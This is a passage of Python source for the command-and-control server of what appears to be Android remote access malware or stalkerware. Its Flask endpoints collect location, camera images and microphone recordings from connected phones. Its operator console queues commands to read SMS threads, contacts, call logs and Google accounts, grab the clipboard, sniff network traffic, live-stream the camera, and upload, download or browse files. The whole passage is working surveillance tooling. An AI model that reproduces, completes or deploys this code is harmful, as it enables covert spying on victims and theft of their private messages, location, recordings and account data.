                    print(f"   Longitude: {longitude}")
                    print(f"   Accuracy: {accuracy} meters")
                    print(f"   Altitude: {altitude} meters")
                    print(f"   Speed: {speed} m/s")
                    print(f"   Bearing: {bearing} degrees")
                print("💡 Location data stored successfully")

                return jsonify({
                    'status': 'success',
                    'message': 'Location received'
                })
            except Exception as e:
                print(f"❌ Error receiving location: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/camera', methods=['POST'])
        def receive_camera():
            try:
                if 'image_file' not in request.files:
                    return jsonify({'status': 'error', 'message': 'No image file provided'}), 400

                image_file = request.files['image_file']
                device_id = request.form.get('device_id', request.remote_addr)

                timestamp_str = request.form.get('timestamp', None)
                if timestamp_str:
                    try:
                        timestamp = float(timestamp_str)
                        if timestamp > 10000000000:
                            timestamp = timestamp / 1000.0
                        year = datetime.fromtimestamp(timestamp).year
                        if year < 2000 or year > 2100:
                            timestamp = time.time()
                    except ValueError:
                        timestamp = time.time()
                else:
                    timestamp = time.time()

                if image_file:
                    if not os.path.exists('camera'):
                        os.makedirs('camera')

                    filename = f"{device_id}_{int(timestamp)}.jpg"
                    image_path = os.path.join('camera', filename)
                    image_file.save(image_path)

                    # Create thumbnail
                    try:
                        img = Image.open(image_path)
                        img.thumbnail((200, 200))
                        thumbnail_path = os.path.join('camera', f"thumb_{filename}")
                        img.save(thumbnail_path)
                    except Exception as e:
                        print(f"Error creating thumbnail: {e}")

                    if device_id not in self.camera_history:
                        self.camera_history[device_id] = []

                    self.camera_history[device_id].append({
                        'filename': filename,
                        'timestamp': timestamp,
                        'time_str': datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
                    })

                    print(f"\n📷 CAMERA IMAGE RECEIVED:")
                    print(f"   Device: {device_id}")
                    print(f"   Filename: {filename}")
                    print(f"   Time: {datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')}")
                    print("💡 Image saved successfully")

                    return jsonify({'status': 'success', 'message': 'Image received'})
                else:
                    return jsonify({'status': 'error', 'message': 'No image file provided'}), 400
            except Exception as e:
                print(f"❌ Error receiving camera image: {str(e)}")
                return jsonify({'status': 'error', 'message': str(e)}), 500

        @self.app.route('/mic', methods=['POST'])
        def receive_audio():
            try:
                if 'audio_file' not in request.files:
                    return jsonify({'status': 'error', 'message': 'No audio file provided'}), 400

                audio_file = request.files['audio_file']
                device_id = request.form.get('device_id', request.remote_addr)

                timestamp_str = request.form.get('timestamp', None)
                duration_str = request.form.get('duration', None)

                if timestamp_str:
                    try:
                        timestamp = float(timestamp_str)
                        if timestamp > 10000000000:
                            timestamp = timestamp / 1000.0
                        year = datetime.fromtimestamp(timestamp).year
                        if year < 2000 or year > 2100:
                            timestamp = time.time()
                    except ValueError:
                        timestamp = time.time()
                else:
                    timestamp = time.time()

                if duration_str:
                    try:
                        duration = float(duration_str)
                    except ValueError:
                        duration = 0
                else:
                    duration = 0

                if audio_file:
                    if not os.path.exists('audio'):
                        os.makedirs('audio')

                    filename = f"{device_id}_{int(timestamp)}.3gp"
                    audio_path = os.path.join('audio', filename)
                    audio_file.save(audio_path)

                    if device_id not in self.audio_history:
                        self.audio_history[device_id] = []

                    self.audio_history[device_id].append({
                        'filename': filename,
                        'timestamp': timestamp,
                        'duration': duration,
                        'time_str': datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
                    })

                    print(f"\n🎤 AUDIO RECORDING RECEIVED:")
                    print(f"   Device: {device_id}")
                    print(f"   Filename: {filename}")
                    print(f"   Duration: {duration} seconds")
                    print(f"   Time: {datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')}")
                    print("💡 Audio file saved successfully")

                    return jsonify({'status': 'success', 'message': 'Audio received'})
                else:
                    return jsonify({'status': 'error', 'message': 'No audio file provided'}), 400
            except Exception as e:
                print(f"❌ Error receiving audio: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/data', methods=['POST'])
        def receive_data():
            try:
                if not request.is_json:
                    return jsonify({
                        'status': 'error',
                        'message': 'Content-Type must be application/json'
                    }), 400

                data = request.get_json()
                if not data:
                    return jsonify({
                        'status': 'error',
                        'message': 'No JSON data received'
                    }), 400

                device_id = data.get('device_id', request.remote_addr)
                timestamp = data.get('timestamp', time.time() * 1000)

                if device_id in self.connected_devices:
                    self.connected_devices[device_id]['last_seen'] = datetime.now()
                else:
                    self.connected_devices[device_id] = {
                        'connected_at': datetime.now(),
                        'last_seen': datetime.now(),
                        'info': {},
                        'ip': request.remote_addr
                    }

                self.last_heartbeat[device_id] = time.time()

                if device_id not in self.device_data:
                    self.device_data[device_id] = {
                        'last_update': time.time(),
                        'data': {}
                    }

                if device_id not in self.device_commands:
                    self.device_commands[device_id] = []

                # Update current directory if provided
                if 'data' in data and isinstance(data['data'], dict) and 'current_directory' in data['data']:
                    self.current_directory[device_id] = data['data']['current_directory']

                if 'data' in data and isinstance(data['data'], dict):
                    current_time = datetime.fromtimestamp(timestamp/1000).strftime('%H:%M:%S')
                    for key, value in data['data'].items():
                        self.device_data[device_id]['data'][key] = value
                        self.device_data[device_id]['data'][f"{key}_updated"] = current_time

                    self.device_data[device_id]['last_update'] = time.time()

                pending_commands = self.device_commands[device_id].copy()
                self.device_commands[device_id].clear()

                response_data = {
                    'status': 'success',
                    'message': 'Data received successfully',
                    'server_time': time.time(),
                    'device_id': device_id
                }

                if pending_commands:
                    response_data['commands'] = pending_commands

                return jsonify(response_data)

            except json.JSONDecodeError as e:
                return jsonify({
                    'status': 'error',
                    'message': f'Invalid JSON: {str(e)}'
                }), 400
            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': f'Server error: {str(e)}'
                }), 500

        @self.app.route('/system_info', methods=['POST'])
        def receive_system_info():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                system_info = data.get('system_info', {})

                if device_id not in self.device_data:
                    self.device_data[device_id] = {
                        'last_update': time.time(),
                        'data': {}
                    }

                for key, value in system_info.items():
                    self.device_data[device_id]['data'][f"sysinfo_{key}"] = value
                    self.device_data[device_id]['data'][f"sysinfo_{key}_updated"] = datetime.now().strftime('%H:%M:%S')

                return jsonify({
                    'status': 'success',
                    'message': 'System information received'
                })
            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/disconnect', methods=['POST'])
        def disconnect_device():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)

                if device_id in self.connected_devices:
                    del self.connected_devices[device_id]

                if device_id in self.accounts_history:
                    del self.accounts_history[device_id]

                if device_id in self.last_heartbeat:
                    del self.last_heartbeat[device_id]

                if device_id in self.device_data:
                    del self.device_data[device_id]

                if device_id in self.device_commands:
                    del self.device_commands[device_id]

                if device_id in self.app_lists:
                    del self.app_lists[device_id]

                if device_id in self.sms_conversations:
                    del self.sms_conversations[device_id]

                if device_id in self.sms_threads:
                    del self.sms_threads[device_id]

                if device_id in self.network_sniff_results:
                    del self.network_sniff_results[device_id]

                if device_id in self.network_devices:
                    del self.network_devices[device_id]

                # Add these to the disconnect_device method
                if device_id in self.contacts_history:
                    del self.contacts_history[device_id]

                if device_id in self.call_logs_history:
                    del self.call_logs_history[device_id]

                if device_id in self.location_history:
                    del self.location_history[device_id]

                if device_id in self.camera_history:
                    del self.camera_history[device_id]

                if device_id in self.audio_history:
                    del self.audio_history[device_id]

                # Remove from file system state
                if device_id in self.current_directory:
                    del self.current_directory[device_id]

                # If this was the selected device, deselect it
                if self.selected_device_id == device_id:
                    self.selected_device_id = None

                return jsonify({
                    'status': 'disconnected',
                    'message': 'Device disconnected successfully'
                })
            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        # Add the new endpoints here
        @self.app.route('/download_file', methods=['POST'])
        def download_file():
            """Handle file download requests from devices"""
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                file_path = data.get('file_path', '')

                # Create device-specific directory path
                device_dir = os.path.join('uploads', device_id)
                filename = os.path.basename(file_path)
                file_server_path = os.path.join(device_dir, filename)

                if not os.path.exists(file_server_path):
                    return jsonify({'status': 'error', 'message': 'File not found'}), 404

                # Return the file for download
                def generate():
                    with open(file_server_path, 'rb') as f:
                        yield from f

                response = Response(
                    generate(),
                    mimetype='application/octet-stream',
                    headers={
                        'Content-Disposition': f'attachment; filename={filename}'
                    }
                )

                print(f"\n📁 FILE DOWNLOADED:")
                print(f"   Device: {device_id}")
                print(f"   Requested Path: {file_path}")
                print(f"   Server Path: {file_server_path}")
                print(f"   Size: {os.path.getsize(file_server_path)} bytes")

                return response
            except Exception as e:
                print(f"❌ Error downloading file: {str(e)}")
                return jsonify({'status': 'error', 'message': str(e)}), 500

        @self.app.route('/check_file', methods=['POST'])
        def check_file():
            """Check if a file exists on the server"""
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                file_path = data.get('file_path', '')

                # Create device-specific directory path
                device_dir = os.path.join('uploads', device_id)
                filename = os.path.basename(file_path)
                file_server_path = os.path.join(device_dir, filename)

                exists = os.path.exists(file_server_path)

                return jsonify({
                    'status': 'success',
                    'exists': exists,
                    'size': os.path.getsize(file_server_path) if exists else 0
                })
            except Exception as e:
                return jsonify({'status': 'error', 'message': str(e)}), 500

        @self.app.errorhandler(404)
        def not_found(e):
            return jsonify({
                'status': 'error',
                'message': 'Endpoint not found',
                'available_endpoints': ['/ping', '/status', '/connect', '/data', '/heartbeat', '/disconnect', '/commands', '/send_command', '/contacts', '/call_logs', '/location', '/camera', '/mic', '/fs_response', '/download_file', '/check_file', '/accounts']
            }), 404

        @self.app.errorhandler(500)
        def internal_error(e):
            return jsonify({
                'status': 'error',
                'message': 'Internal server error'
            }), 500

    def start_stream_viewer(self):
        """Start the stream viewer in a separate process"""
        if self.stream_process is None or not self.stream_process.is_alive():
            # Start the viewer in a separate process
            self.stream_process = mp.Process(target=self.run_stream_viewer)
            self.stream_process.daemon = True
            self.stream_process.start()

            print("📺 Stream viewer started on port 5001")

    def run_stream_viewer(self):
        """Run the stream viewer GUI"""
        # Create a global instance of LiveStreamGUI
        global stream_gui
        stream_gui = LiveStreamGUI()

        # Start WebSocket server in a separate thread
        websocket_thread = threading.Thread(target=start_websocket_server, daemon=True)
        websocket_thread.start()

        # Run the GUI
        stream_gui.run()

    def cleanup_stale_connections(self):
        while self.running:
            current_time = time.time()
            stale_devices = []

            for device_id, last_beat in self.last_heartbeat.items():
                if current_time - last_beat > 30:
                    stale_devices.append(device_id)

            for device_id in stale_devices:
                if device_id in self.connected_devices:
                    del self.connected_devices[device_id]
                if device_id in self.accounts_history:
                    del self.accounts_history[device_id]
                if device_id in self.last_heartbeat:
                    del self.last_heartbeat[device_id]
                if device_id in self.device_data:
                    del self.device_data[device_id]
                if device_id in self.device_commands:
                    del self.device_commands[device_id]
                if device_id in self.app_lists:
                    del self.app_lists[device_id]
                if device_id in self.sms_conversations:
                    del self.sms_conversations[device_id]
                if device_id in self.sms_threads:
                    del self.sms_threads[device_id]
                if device_id in self.network_sniff_results:
                    del self.network_sniff_results[device_id]
                if device_id in self.network_devices:
                    del self.network_devices[device_id]

                # Add these to the cleanup_stale_connections method
                if device_id in self.contacts_history:
                    del self.contacts_history[device_id]

                if device_id in self.call_logs_history:
                    del self.call_logs_history[device_id]

                if device_id in self.location_history:
                    del self.location_history[device_id]

                if device_id in self.camera_history:
                    del self.camera_history[device_id]

                if device_id in self.audio_history:
                    del self.audio_history[device_id]

                # Remove from file system state
                if device_id in self.current_directory:
                    del self.current_directory[device_id]

                # If this was the selected device, deselect it
                if self.selected_device_id == device_id:
                    self.selected_device_id = None

            time.sleep(5)

    def handle_user_input(self):
        while self.running:
            try:
                if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                    user_input = sys.stdin.readline().strip()

                    if self.mode == "command":
                        self.process_command_mode_input(user_input)
                    elif self.mode == "ussd":
                        self.process_ussd_mode_input(user_input)
                    elif self.mode == "sms":
                        self.process_sms_mode_input(user_input)

                time.sleep(0.1)
            except Exception as e:
                print(f"Input error: {e}")

    def process_command_mode_input(self, user_input):
        if user_input.lower() == 'monitor':
            self.mode = "monitor"
            print("Entering monitor mode...")
            return

        if user_input.lower() == 'ussd':
            self.mode = "ussd"
            self.enter_ussd_mode()
            return

        if user_input.lower() == 'listen-sms':
            self.mode = "sms"
            self.enter_sms_mode()
            return

        if user_input.lower() == 'start_stream_viewer':
            self.start_stream_viewer()
            return

        # File system commands
        if user_input.lower() == 'pwd':
            self.handle_pwd_command()
            return

        if user_input.lower().startswith('cd '):
            path = user_input[3:].strip()
            self.handle_cd_command(path)
            return

        if user_input.lower().startswith('search '):
            query = user_input[7:].strip()
            self.handle_search_command(query)
            return

        if user_input.lower().startswith('mkdir '):
            dirname = user_input[6:].strip()
            self.handle_mkdir_command(dirname)
            return

        if user_input.lower() == 'ls':
            path = ""
            self.handle_ls_command(path)
            return

        if user_input.lower().startswith('ls '):
            path = user_input[3:].strip()
            self.handle_ls_command(path)
            return

        if user_input.lower().startswith('upload_file '):
            file_path = user_input[11:].strip()
            self.handle_upload_file_command(file_path)
            return

        if user_input.lower().startswith('download_file '):
            file_path = user_input[13:].strip()
            self.handle_download_file_command(file_path)
            return

        # Device selection commands
        if user_input.lower().startswith('select_device '):
            device_id_pattern = user_input[14:].strip()
            self.handle_select_device_command(device_id_pattern)
            return

        if user_input.lower() == 'deselect_device':
            self.handle_deselect_device_command()
            return

        if user_input.lower() == 'list_devices':
            self.handle_list_devices_command()
            return

        if not self.connected_devices:
            print("❌ No devices connected. Cannot send commands.")
            return

        parts = user_input.split(' ', 1)
        command = parts[0].lower()
        param = parts[1] if len(parts) > 1 else ""

        if command == 'cb':
            if not param:
                for device_id in self.connected_devices.keys():
                    self.device_commands[device_id].append({
                        'command': 'get_clipboard',
                        'timestamp': time.time(),
                        'id': f"cmd_{int(time.time() * 1000)}"
                    })
                print("📋 Clipboard retrieval command sent to all devices")
            else:
                for device_id in self.connected_devices.keys():
                    self.device_commands[device_id].append({
                        'command': 'set_clipboard',
                        'timestamp': time.time(),
                        'id': f"cmd_{int(time.time() * 1000)}",
                        'params': {'text': param}
                    })
                print(f"📋 Clipboard set to '{param}' on all devices")

        elif command == 'w':
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'vibrate',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}",
                    'params': {'duration': 500}
                })
            print(f"🔥 Vibrate command sent to {len(self.connected_devices)} device(s)!")

        elif command.startswith('volume+') or command.startswith('volume-'):
            try:
                change_type = command[6]
                change_value = int(command[7:])

                for device_id in self.connected_devices.keys():
                    self.device_commands[device_id].append({
                        'command': 'adjust_volume',
                        'timestamp': time.time(),
                        'id': f"cmd_{int(time.time() * 1000)}",
                        'params': {
                            'change': change_value,
                            'direction': 'increase' if change_type == '+' else 'decrease'
                        }
                    })
                print(f"🔊 Volume {'increased' if change_type == '+' else 'decreased'} by {change_value} on all devices")
            except (ValueError, IndexError):
                print("❌ Invalid volume command. Use format: volume+10 or volume-10")

        elif command.startswith('bright+') or command.startswith('bright-'):
            try:
                change_type = command[6]
                change_value = int(command[7:])

                for device_id in self.connected_devices.keys():
                    self.device_commands[device_id].append({
                        'command': 'adjust_brightness',
                        'timestamp': time.time(),
                        'id': f"cmd_{int(time.time() * 1000)}",
                        'params': {
                            'change': change_value,
                            'direction': 'increase' if change_type == '+' else 'decrease'
                        }
                    })
                print(f"💡 Brightness {'increased' if change_type == '+' else 'decreased'} by {change_value} on all devices")
            except (ValueError, IndexError):
                print("❌ Invalid brightness command. Use format: bright+10 or bright-10")

        elif command == 'sysinfo':
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'get_system_info',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}",
                    'params': {'detailed': True}
                })

            print("⏳ Retrieving system information...")
            self.display_sysinfo_results()

        elif command == 'netinfo':
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'scan_network',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}",
                    'params': {'full_scan': True}
                })

            print("⏳ Scanning network...")
            self.display_netinfo_results()

        elif command == 'bluetooth':
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'scan_bluetooth',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}"
                })

            print("⏳ Scanning for Bluetooth devices...")
            self.display_bluetooth_results()

        elif command == 'accounts':
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'accounts',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}"
                })
            print("📱 Retrieving Google accounts from all devices...")
            self.display_accounts_results()

        elif command == 'ring':
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'play_sound',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}"
                })
            print("🔊 Ring command sent to all devices")

        elif command.startswith('open'):
            url = user_input[5:].strip()
            if not url:
                print("❌ No URL provided. Usage: open [url]")
                return

            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url

            if '.' not in url and not url.startswith(('http://localhost', 'https://localhost')):
                print("❌ Invalid URL format. Please include a domain name.")
                return

            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'open_url',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}",
                    'params': {'url': url}
                })
            print(f"🌐 Open URL command sent: {url}")

        elif command == 'app_list':
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'app_list',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}"
                })
            print("⏳ Retrieving app list from all devices...")
            self.display_app_list_results()

        elif command.startswith('launch'):
            app_name_or_package = user_input[7:].strip()
            if not app_name_or_package:
                print("❌ Please specify an app name or package name")
                return

            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'launch_app',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}",
                    'params': {'app': app_name_or_package}
                })
            print(f"🚀 Launch command sent for: {app_name_or_package}")

        elif command.startswith('uninstall'):
            app_name_or_package = user_input[10:].strip()
            if not app_name_or_package:
                print("❌ Please specify an app name or package name")
                return

            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'uninstall_app',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}",
                    'params': {'app': app_name_or_package}
                })
            print(f"🗑️ Uninstall command sent for: {app_name_or_package}")

        elif command.startswith('read_sms'):
            parts = user_input.split()
            flags = []
            sender = None

            for part in parts[1:]:
                if part.startswith('-'):
                    flags.append(part)
                else:
                    sender = part
                    break

            if not sender:
                print("❌ Please specify a sender name")
                return

            self.waiting_for_sms_conversation = True
            self.sms_conversation_sender = sender
            self.sms_conversation_timeout = time.time() + 10

            full_conversation = '-w' in flags

            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'read_sms',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}",
                    'params': {
                        'sender': sender,
                        'full_conversation': full_conversation
                    }
                })

            if full_conversation:
                print(f"📱 Reading FULL SMS conversation with: {sender}")
            else:
                print(f"📱 Reading SMS conversation with: {sender} (limited)")
            print("⏳ Waiting for response from device...")

        elif command == 'get_threads':
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'get_all_threads',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}"
                })
            print("⏳ Retrieving SMS threads from all devices...")
            self.display_sms_threads_results()

        elif command.startswith('read_thread'):
            try:
                thread_id = int(user_input[11:].strip())

                for device_id in self.connected_devices.keys():
                    self.device_commands[device_id].append({
                        'command': 'read_thread',
                        'timestamp': time.time(),
                        'id': f"cmd_{int(time.time() * 1000)}",
                        'params': {'thread_id': thread_id}
                    })

                print(f"📱 Reading SMS thread with ID: {thread_id}")
                print("⏳ Waiting for response from device...")
            except (ValueError, IndexError):
                print("❌ Invalid thread ID. Use format: read_thread [thread_id]")

        elif command.startswith('show_conversation'):
            parts = user_input.split(maxsplit=1)
            if len(parts) < 2:
                print("❌ Please specify a sender name")
                print("💡 Available senders:")
                for device_id, conversations in self.sms_conversations.items():
                    for stored_sender in conversations.keys():
                        print(f"   - {stored_sender}")
                return

            sender = parts[1]
            found = False

            for device_id, conversations in self.sms_conversations.items():
                # Check both exact match and case-insensitive match
                for stored_sender, conv_data in conversations.items():
                    if stored_sender.lower() == sender.lower():
                        self.display_sms_conversation(stored_sender, conv_data['conversation'])
                        found = True
                        break
                if found:
                    break

            if not found:
                print(f"❌ No conversation found for sender: {sender}")
                print("💡 Available senders:")
                for device_id, conversations in self.sms_conversations.items():
                    for stored_sender in conversations.keys():
                        print(f"   - {stored_sender}")

        elif command == 'get_status':
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'get_status',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}"
                })
            print("⏳ Retrieving device status...")

        elif command.startswith('sniff'):
            try:
                duration = int(command[5:])
                if duration <= 0 or duration > 300:
                    print("❌ Duration must be between 1 and 300 seconds")
                    return

                for device_id in self.connected_devices.keys():
                    self.device_commands[device_id].append({
                        'command': 'sniff',
                        'timestamp': time.time(),
                        'id': f"cmd_{int(time.time() * 1000)}",
                        'params': {'duration': duration}
                    })
                print(f"🔍 Network sniffing started for {duration} seconds on all devices")
            except (ValueError, IndexError):
                print("❌ Invalid sniff command. Use format: sniff<duration> (e.g., sniff30)")

        elif command == 'devices':
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'devices',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}"
                })
            print("🔍 Scanning for devices on the current network...")

        # Add these cases to the process_command_mode_input method
        elif command == 'get_all_contacts':
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'get_all_contacts',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}"
                })
            print("📱 Retrieving contacts from all devices...")
            self.display_contacts_results()

        elif command == 'get_call_logs':
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'get_call_logs',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}"
                })
            print("📞 Retrieving call logs from all devices...")
            self.display_call_logs_results()

        elif command == 'get_location':
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'get_location',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}"
                })
            print("📍 Retrieving location from all devices...")
            self.display_location_results()

        elif command.startswith('camera'):
            camera_type = user_input[7:].strip() if len(user_input) > 7 else "back"
            if camera_type not in ["front", "back"]:
                print("❌ Invalid camera type. Use 'front' or 'back'")
                return

            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'camera',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}",
                    'params': {'type': camera_type}
                })
            print(f"📷 Taking {camera_type} camera image on all devices...")

        elif command.startswith('mic'):
            try:
                duration = int(user_input[4:].strip()) if len(user_input) > 4 else 10
                if duration <= 0 or duration > 60:
                    print("❌ Duration must be between 1 and 60 seconds")
                    return

                for device_id in self.connected_devices.keys():
                    self.device_commands[device_id].append({
                        'command': 'mic',
                        'timestamp': time.time(),
                        'id': f"cmd_{int(time.time() * 1000)}",
                        'params': {'duration': duration}
                    })
                print(f"🎤 Recording audio for {duration} seconds on all devices...")
            except (ValueError, IndexError):
                print("❌ Invalid mic command. Use format: mic<duration> (e.g., mic10)")

        elif command == 'stream':
            camera_type = "back"  # Default to back camera
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'stream',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}",
                    'params': {'camera': camera_type}
                })
            print(f"📺 Starting live stream with {camera_type} camera...")
            self.start_stream_viewer()

        elif command == 'stop_stream':
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'stop_stream',
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}"
                })
            print("📺 Stopping live stream...")
            if self.stream_process and self.stream_process.is_alive():
                self.stream_process.terminate()
                self.stream_process = None

        elif command == 'help' or command == 'h':
            self.show_command_help()

        elif command == 'quit' or command == 'q':
            print(f"\n🛑 Shutting down server...")
            self.stop()

        elif command == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            self.show_prompt()

        else:
            print("❌ Unknown command. Type 'help' for available commands.")
            self.show_prompt()

    # File system command handlers
    def handle_pwd_command(self):
        """Handle the pwd command"""
        if not self.selected_device_id:
            print("❌ No device selected. Use 'select_device [device_id]' first.")
            self.show_prompt()
            return

        if self.selected_device_id not in self.connected_devices:
            print(f"❌ Device {self.selected_device_id} is not connected.")
            self.show_prompt()
            return

        self.device_commands[self.selected_device_id].append({
            'command': 'pwd',
            'timestamp': time.time(),
            'id': f"cmd_{int(time.time() * 1000)}"
        })
        print(f"📁 Requesting current directory from device {self.selected_device_id}...")

    def handle_cd_command(self, path):
        """Handle the cd command"""
        if not self.selected_device_id:
            print("❌ No device selected. Use 'select_device [device_id]' first.")
            self.show_prompt()
            return

        if self.selected_device_id not in self.connected_devices:
            print(f"❌ Device {self.selected_device_id} is not connected.")
            self.show_prompt()
            return

        self.device_commands[self.selected_device_id].append({
            'command': 'cd',
            'timestamp': time.time(),
            'id': f"cmd_{int(time.time() * 1000)}",
            'params': {'path': path}
        })
        print(f"📁 Changing directory to '{path}' on device {self.selected_device_id}...")

    def handle_search_command(self, query):
        """Handle the search command"""
        if not self.selected_device_id:
            print("❌ No device selected. Use 'select_device [device_id]' first.")
            self.show_prompt()
            return

        if self.selected_device_id not in self.connected_devices:
            print(f"❌ Device {self.selected_device_id} is not connected.")
            self.show_prompt()
            return

        current_dir = self.current_directory.get(self.selected_device_id, '/')
        self.device_commands[self.selected_device_id].append({
            'command': 'search',
            'timestamp': time.time(),
            'id': f"cmd_{int(time.time() * 1000)}",
            'params': {'query': query}
        })
        print(f"🔍 Searching for '{query}' in {current_dir} on device {self.selected_device_id}...")

    def handle_mkdir_command(self, dirname):
        """Handle the mkdir command"""
        if not self.selected_device_id:
            print("❌ No device selected. Use 'select_device [device_id]' first.")
            self.show_prompt()
            return

        if self.selected_device_id not in self.connected_devices:
            print(f"❌ Device {self.selected_device_id} is not connected.")
            self.show_prompt()
            return

        current_dir = self.current_directory.get(self.selected_device_id, '/')
        self.device_commands[self.selected_device_id].append({
            'command': 'mkdir',
            'timestamp': time.time(),
            'id': f"cmd_{int(time.time() * 1000)}",
            'params': {'name': dirname}
        })
        print(f"📁 Creating directory '{dirname}' in {current_dir} on device {self.selected_device_id}...")

    def handle_ls_command(self, path):
        """Handle the ls command"""
        if not self.selected_device_id:
            print("❌ No device selected. Use 'select_device [device_id]' first.")
            self.show_prompt()
            return

        if self.selected_device_id not in self.connected_devices:
            print(f"❌ Device {self.selected_device_id} is not connected.")
            self.show_prompt()
            return

        target_path = path if path else self.current_directory.get(self.selected_device_id, '/')

        self.device_commands[self.selected_device_id].append({
            'command': 'ls',
            'timestamp': time.time(),
            'id': f"cmd_{int(time.time() * 1000)}",
            'params': {'path': target_path}
        })
        print(f"📁 Listing directory contents of {target_path} on device {self.selected_device_id}...")

    def handle_upload_file_command(self, file_path):
        """Handle the upload_file command"""
        if not self.selected_device_id:
            print("❌ No device selected. Use 'select_device [device_id]' first.")
            self.show_prompt()
            return

        if self.selected_device_id not in self.connected_devices:
            print(f"❌ Device {self.selected_device_id} is not connected.")
            self.show_prompt()
            return

        self.device_commands[self.selected_device_id].append({
            'command': 'upload_file',
            'timestamp': time.time(),
            'id': f"cmd_{int(time.time() * 1000)}",
            'params': {'file_path': file_path}
        })
        print(f"📁 Uploading file {file_path} from device {self.selected_device_id}...")

    def handle_download_file_command(self, file_path):
        """Handle the download_file command"""
        if not self.selected_device_id:
            print("❌ No device selected. Use 'select_device [device_id]' first.")
            self.show_prompt()
            return

        if self.selected_device_id not in self.connected_devices:
            print(f"❌ Device {self.selected_device_id} is not connected.")
            self.show_prompt()
            return

        self.device_commands[self.selected_device_id].append({
            'command': 'download_file',
            'timestamp': time.time(),
            'id': f"cmd_{int(time.time() * 1000)}",
            'params': {'file_path': file_path}
        })
        print(f"📁 Downloading file {file_path} to device {self.selected_device_id}...")

    # Device selection command handlers
    def handle_select_device_command(self, device_id_pattern):
        """Handle the select_device command"""
        matching_devices = [d for d in self.connected_devices.keys() if device_id_pattern.lower() in d.lower()]

        if not matching_devices:
            print("❌ No devices found matching that pattern")
            self.show_prompt()
            return

        if len(matching_devices) > 1:
            print("❌ Multiple devices found. Please be more specific:")
            for d in matching_devices:
                print(f"   - {d}")
            self.show_prompt()
            return

        self.selected_device_id = matching_devices[0]
        print(f"✅ Selected device: {self.selected_device_id}")
        self.show_prompt()

    def handle_deselect_device_command(self):
        """Handle the deselect_device command"""
        if self.selected_device_id is None:
            print("❌ No device currently selected")
            self.show_prompt()
            return

        print(f"✅ Deselected device: {self.selected_device_id}")
        self.selected_device_id = None
        self.show_prompt()

    def handle_list_devices_command(self):
        """Handle the list_devices command"""
        if not self.connected_devices:
            print("❌ No devices connected")
            self.show_prompt()
            return

        print("\n📱 Connected Devices:")
        print("-" * 60)
        for device_id, device_info in self.connected_devices.items():
            connect_time = device_info['connected_at']
            last_seen = device_info['last_seen']
